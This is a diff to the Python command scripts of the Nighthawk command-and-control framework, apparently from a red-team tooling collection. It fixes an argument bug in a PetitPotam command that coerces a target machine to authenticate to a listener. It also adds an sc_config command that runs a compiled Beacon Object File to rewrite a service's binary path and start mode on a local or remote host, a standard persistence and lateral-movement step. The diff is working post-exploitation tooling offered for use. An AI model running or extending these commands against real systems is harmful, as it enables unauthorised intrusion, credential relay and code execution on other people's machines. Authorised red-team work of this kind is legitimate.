@@ -1085,12 +1085,12 @@ def petit_potam(params, info):
     Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability.
     """
 
-    if len(args) < 2:
+    if len(params) < 2:
         nighthawk.console_write(CONSOLE_ERROR, "Usage: petit_potam <targetMachine> <listenerMachine>")
         return False
 
-    target_machine = args[0]
-    listener_machine = args[1]
+    target_machine = params[0]
+    listener_machine = params[1]
     packer = Packer()
     packer.addstr(target_machine)
     packer.addstr(listener_machine)
@@ -1742,4 +1742,78 @@ nighthawk.register_command(
     THIS IS AN AVANTGUARD SCRIPT""",
     "priv_check_all"
 )
+# endregion
+
+# region sc_config
+
+def sc_config(params, info):
+    """
+    This command configures an existing service on the target host.
+    """
+
+    if len(params) < 4:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>")
+        return False
+
+    hostname = ""
+    servicename = params[0]
+    binpath = params[1]
+    errmode = params[2]
+    startmode = params[3]
+    if len(params) >= 5: hostname = params[4]
+
+    packer = Packer()
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packer.addstr(binpath)
+    packer.addint16(errmode)
+    packer.addint16(startmode)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_config/sc_config.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing sc_config BOF")
+    notification = api.execute_bof(
+        f"sc_config.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    sc_config,
+    "sc_config",
+    "BOF - This command configures an existing service on the target host. (avantguard script)",
+    "BOF - This command configures an existing service on the target host. (avantguard script)",
+    """sc_config
+    Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         BINPATH      Required. The binary path of the service to execute.
+         ERRORMODE    Required. The error mode of the service. The valid 
+                      options are:
+                        0 - ignore errors
+                        1 - normal logging
+                        2 - log severe errors
+                        3 - log critical errors
+         STARTMODE    Required. The start mode for the service. The valid
+                      options are:
+                        2 - auto start
+                        3 - on demand start
+                        4 - disabled
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "sc_config"
+)
+
 # endregion
